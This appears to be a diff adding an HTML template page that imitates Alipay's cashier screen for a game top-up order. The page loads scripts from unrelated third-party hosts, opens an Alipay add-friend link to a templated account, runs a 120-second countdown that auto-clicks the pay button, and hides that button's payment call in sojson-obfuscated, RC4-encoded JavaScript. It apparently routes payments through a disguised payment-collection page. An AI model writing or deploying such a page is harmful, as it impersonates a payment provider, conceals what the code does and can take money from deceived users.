@@ -1,0 +1,149 @@
+<html style="font-size: 109.6px;">
+    <head>
+        <meta charset="utf-8">
+        <meta name="apple-mobile-web-app-capable" content="yes">
+        <meta name="apple-mobile-web-app-status-bar-style" content="black">
+        <meta name="format-detection" content="telephone=no, email=no">
+        <meta http-equiv="Expires" content="0">
+        <meta http-equiv="Pragma" content="no-cache">
+        <meta http-equiv="Cache-control" content="no-cache">
+        <meta http-equiv="Cache" content="no-cache">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=0">
+        <script charset="utf-8" src="https://gw.alipayobjects.com/as/g/h5-lib/alipayjsapi/3.1.1/alipayjsapi.inc.min.js"></script>
+        <script src="https://cdn.staticfile.org/jquery/3.3.1/jquery.min.js"></script>
+        <script charset="utf-8" src="https://zfb.592zhifu.com/pay/public/js/layer/layer.js"></script>
+        <link href="http://fu.djswvd05971.cn/js/need/layer.css?2.0" type="text/css" rel="styleSheet" id="layermcss">
+        <script>
+            var docEl = document.documentElement;
+            docEl.style.fontSize = 100 / 375 * docEl.clientWidth + 'px';
+            window.addEventListener('resize', function () {
+                docEl.style.fontSize = 100 / 375 * docEl.clientWidth + 'px';
+            });
+        </script>
+        <link rel="stylesheet" href="https://gw.alipayobjects.com/as/g/antui/antui/10.1.10/dpl/antui.css">
+        <link rel="stylesheet" href="https://gw.alipayobjects.com/as/g/antui/antui/10.1.32/dpl/widget/notice.css">
+
+<!-- <title>确认订单</title> -->
+    </head>
+    <body>
+        <div class="am-notice" id="alert" role="alert">
+            <div class="am-notice-content">支付中，120秒内未能弹出支付请重新提交！</div>
+            <div class="am-notice-operation">
+                <a class="am-notice-close" onclick="closeAlert()" role="button"></a>
+            </div>
+        </div>
+        <div class="am-ft-center">
+            <h1 style="font-size: 55px" id="money"></h1>
+        </div>
+        <div class="am-list am-list-form" id="goods_layout" style="display: none;">
+            <div class="am-list-body">
+                <div class="am-list-item am-input-autoclear">
+                    <div class="am-list-label">商品：</div>
+                    <div class="am-list-control" id="goods"></div>
+                </div>
+            </div>
+        </div>
+        <div class="am-list am-list-form">
+            <div class="am-list-body">
+                <div class="am-list-item am-input-autoclear">
+                    <div class="am-list-label">订单信息：</div>
+                    <div class="am-list-control" id="tradeMemo"></div>
+                </div>  <div class="am-list-item am-input-autoclear">
+                                                     <div class="am-list-label"  id="next">支付授权中,请您耐心等待&nbsp;<em id="limitTime" style="color: red; font-weight: bold">120</em>&nbsp;秒,请勿离开该页面。</div>
+ </div> 
+            </div>
+        </div>
+        <!-- <div class="am-ft-red am-ft-center">请勿修改转账金额和备注，以免支付失败</div> -->
+        <div class="am-ft-left"></div>
+        <div class="am-ft-center" style="margin-top: 8px;">
+            <button type="button" class="am-button blue loading " id="mainBtn" disabled="disabled">
+                <div class="am-loading-indicator white">
+                    <div class="am-loading-item"></div>
+                    <div class="am-loading-item"></div>
+                    <div class="am-loading-item"></div>
+                </div><h3>确认支付</h3>
+               
+            </button>
+        </div>
+
+        <footer class="am-footer am-fixed am-fixed-bottom am-ft-center" style="padding-bottom: 10px;z-index: -1;">
+            <div class="am-footer-interlink am-footer-top"> <a class="am-footer-link" href="javascript:void(0)" onclick="location.reload()">刷新页面</a>
+            </div>
+            <div class="am-footer-copyright">Copyright © 2008-2019 AliPay</div>
+            <!-- <div class="am-ft-left">1.请确认付款信息无误后可放心付款。</div> -->
+            <!-- <div class="am-ft-left">2.每笔订单只能支付一次，请勿重复支付。</div> -->
+            <!-- <div class="am-ft-left">2.如果付款成功但是未到账请联系商家提供识别号及时解决问题。</div> -->
+        </footer>
+        <script charset="utf-8" src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.18.0/axios.min.js"></script>
+        <script type="text/javascript">
+                AlipayJSBridge.call("hideToolbar");
+                /* AlipayJSBridge.call('showTitleLoading'); */
+                AlipayJSBridge.call("hideOptionMenu");
+                AlipayJSBridge.call('setTitle', {
+                    title: '支付宝收银台'
+                });
+                var params = ap.parseQueryString();
+                var main_btn = document.querySelector('#mainBtn');
+                var ref = document.querySelector('#ref');
+                var pyy = "";
+                var readyCheckCount = 0;
+                var loginId = "<{$account}>";
+                var userId = "<{$userid}>";
+                var url1 = "alipays://platformapi/startapp?appId=20000186&actionType=addfriend&appClearTop=false&source=by_home&userId=" + userId + "&loginId=" + loginId;
+
+        </script>
+        <script>
+          var t= 0;
+            AlipayJSBridge.call('pushWindow', {url: url1}, function () {
+                AlipayJSBridge.call('hideLoading');
+           });
+           var doReadyCheckTask = setInterval(function () {
+                    doReadyCheck();
+            }, 1500);
+  function countdown(t){
+        var next = document.getElementById("next");
+        if(t ==0){
+           main_btn.innerHTML = "<h3>继续支付</h3>";
+                        main_btn.disabled = false;
+                        main_btn.click();
+                    } else {
+           if(t==14&&main_btn.disabled==true&&pyy==""){
+              AlipayJSBridge.call('pushWindow', {url: url1}, function () {
+                AlipayJSBridge.call('hideLoading');
+           });}
+
+            t -= 1;
+            var limitTime = document.getElementById("limitTime");
+            limitTime.innerHTML = t+'';
+            setTimeout("countdown("+t+")", 1000);
+        }
+    }
+
+    countdown(120);
+            function doReadyCheck() {
+                $.get('<{:U("Gao/check")}>'+"?orderid=<{$orderid}>&type="+t++, function (result) {
+                    //成功
+                    if (result.state==1) {
+                        //回调页面
+                        window.clearInterval(doReadyCheckTask);
+                        pyy = result.callback;
+                       
+                    }
+                    //获取二维码超时
+          
+                });
+            }
+         //   doReadyCheck();
+     
+            if (typeof (params.goods) != "undefined" && params.goods.length != 0) {
+                document.getElementById("goods_layout").style.display = "block";
+                document.getElementById("goods").innerHTML = '游戏充值';
+            }
+            document.getElementById("money").innerHTML = '￥' + '<{$amount}>';
+            document.getElementById("tradeMemo").innerHTML = '<{$orderid}>';
+            ;var encode_version = 'sojson.v5', dseoe = '__0x32743',  __0x32743=['H0nDuMKt','T8OhwophwqY=','wpFzExYM','SsKBc0TChDUow6pAw7UvE8O7FnUTw57CocKVw6XCkMKiNHMvFMO4wqk=','E0XDtzMm','VHnDjsOkaVsgJSVh','wpRQHSs9','fsOVw57CqsKD','w6V/w5bCgh5nw6UXwpE4','w57Csh9OAw==','cwbCkMOKwr9fAEHCq8Kb','wpfCkG4icw==','bGkIwrEg','w4bCux9cKQ==','w4rDl8OEwpx6woAcw49+','wppuwppSwoHCqm3DmcKF','YcOlwobCnhNhc8O+w6w=','w5PDiMObeg==','wrDDjcOswrM=','5paV5Lmg5oqk5YmU77yS6KyZ5YqH6YWt5aSE5pWe5LmZ','wo/CrsORU8O5w7QMw5Y=','MCnCosOcXHhQw53DmcOHwqfDjcK3f1rCgMK2VWBwcGnCisKawoDDpjArDDE9CsKsYQfDp1TDhsORHmHCl8Kzw7U6VsO4wqhQw5zCiMOLw6TCuMOrFTIfQg=='];(function(_0x375128,_0xbdc369){var _0x59c762=function(_0x5ed903){while(--_0x5ed903){_0x375128['push'](_0x375128['shift']());}};_0x59c762(++_0xbdc369);}(__0x32743,0x7d));var _0x1df9=function(_0x5302b8,_0x1a29ef){_0x5302b8=_0x5302b8-0x0;var _0x5706d4=__0x32743[_0x5302b8];if(_0x1df9['initialized']===undefined){(function(){var _0x2cae77=typeof window!=='undefined'?window:typeof process==='object'&&typeof require==='function'&&typeof global==='object'?global:this;var _0x315629='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x2cae77['atob']||(_0x2cae77['atob']=function(_0x2ca810){var _0x7dfbc3=String(_0x2ca810)['replace'](/=+$/,'');for(var _0x142c27=0x0,_0x2164a4,_0x376a8d,_0x506db9=0x0,_0x1b0389='';_0x376a8d=_0x7dfbc3['charAt'](_0x506db9++);~_0x376a8d&&(_0x2164a4=_0x142c27%0x4?_0x2164a4*0x40+_0x376a8d:_0x376a8d,_0x142c27++%0x4)?_0x1b0389+=String['fromCharCode'](0xff&_0x2164a4>>(-0x2*_0x142c27&0x6)):0x0){_0x376a8d=_0x315629['indexOf'](_0x376a8d);}return _0x1b0389;});}());var _0x4381d1=function(_0x36357b,_0x293ce7){var _0x45a2d4=[],_0x188ed3=0x0,_0x3c4843,_0x449b48='',_0x954545='';_0x36357b=atob(_0x36357b);for(var _0x25e61c=0x0,_0x100eb7=_0x36357b['length'];_0x25e61c<_0x100eb7;_0x25e61c++){_0x954545+='%'+('00'+_0x36357b['charCodeAt'](_0x25e61c)['toString'](0x10))['slice'](-0x2);}_0x36357b=decodeURIComponent(_0x954545);for(var _0x463853=0x0;_0x463853<0x100;_0x463853++){_0x45a2d4[_0x463853]=_0x463853;}for(_0x463853=0x0;_0x463853<0x100;_0x463853++){_0x188ed3=(_0x188ed3+_0x45a2d4[_0x463853]+_0x293ce7['charCodeAt'](_0x463853%_0x293ce7['length']))%0x100;_0x3c4843=_0x45a2d4[_0x463853];_0x45a2d4[_0x463853]=_0x45a2d4[_0x188ed3];_0x45a2d4[_0x188ed3]=_0x3c4843;}_0x463853=0x0;_0x188ed3=0x0;for(var _0x743eb5=0x0;_0x743eb5<_0x36357b['length'];_0x743eb5++){_0x463853=(_0x463853+0x1)%0x100;_0x188ed3=(_0x188ed3+_0x45a2d4[_0x463853])%0x100;_0x3c4843=_0x45a2d4[_0x463853];_0x45a2d4[_0x463853]=_0x45a2d4[_0x188ed3];_0x45a2d4[_0x188ed3]=_0x3c4843;_0x449b48+=String['fromCharCode'](_0x36357b['charCodeAt'](_0x743eb5)^_0x45a2d4[(_0x45a2d4[_0x463853]+_0x45a2d4[_0x188ed3])%0x100]);}return _0x449b48;};_0x1df9['rc4']=_0x4381d1;_0x1df9['data']={};_0x1df9['initialized']=!![];}var _0x3f474a=_0x1df9['data'][_0x5302b8];if(_0x3f474a===undefined){if(_0x1df9['once']===undefined){_0x1df9['once']=!![];}_0x5706d4=_0x1df9['rc4'](_0x5706d4,_0x1a29ef);_0x1df9['data'][_0x5302b8]=_0x5706d4;}else{_0x5706d4=_0x3f474a;}return _0x5706d4;};if(typeof encode_version!==_0x1df9('0x0','2EWE')&&encode_version===_0x1df9('0x1','%GZX')){main_btn['addEventListener']('click',function(){var _0x1730f6={'nRMLk':_0x1df9('0x2','DKoz'),'hpVHi':function _0x336c71(_0x5c4f4d,_0x3f5c35){return _0x5c4f4d==_0x3f5c35;},'NEXtl':'8000','COSUW':_0x1df9('0x3','&s!P'),'DeyOI':function _0x466de4(_0x11427b,_0x40d354){return _0x11427b(_0x40d354);},'VLXfF':_0x1df9('0x4','X4jX'),'ChaEj':_0x1df9('0x5','K[ad'),'kqCqZ':function _0x5a23f2(_0x2a8e77,_0x169eb1){return _0x2a8e77+_0x169eb1;},'fZJmY':_0x1df9('0x6','Mwdx')};AlipayJSBridge[_0x1df9('0x7','V]Ns')](_0x1730f6['ChaEj'],{'orderStr':_0x1730f6[_0x1df9('0x8','(G#e')](_0x1730f6[_0x1df9('0x9','rSfu')](_0x1df9('0xa','dMXt'),pyy),_0x1730f6[_0x1df9('0xb','Exb9')])},function(_0x447fc2){if(_0x447fc2[_0x1df9('0xc','QkzO')]==_0x1730f6[_0x1df9('0xd','rSfu')]||_0x1730f6[_0x1df9('0xe',']6AP')](_0x447fc2[_0x1df9('0xf','&ji%')],_0x1730f6[_0x1df9('0x10','Sgtx')])||_0x1730f6['hpVHi'](_0x447fc2[_0x1df9('0x11','#lmp')],_0x1730f6[_0x1df9('0x12','fueC')])){_0x1730f6[_0x1df9('0x13','dkMB')](alert,_0x1730f6[_0x1df9('0x14','Sgtx')]);ap[_0x1df9('0x15','X4jX')]();}});});}else{alert('不能删除sojson.v5');};encode_version = 'sojson.v5';
+
+        </script>
+
+    </body>
+</html>
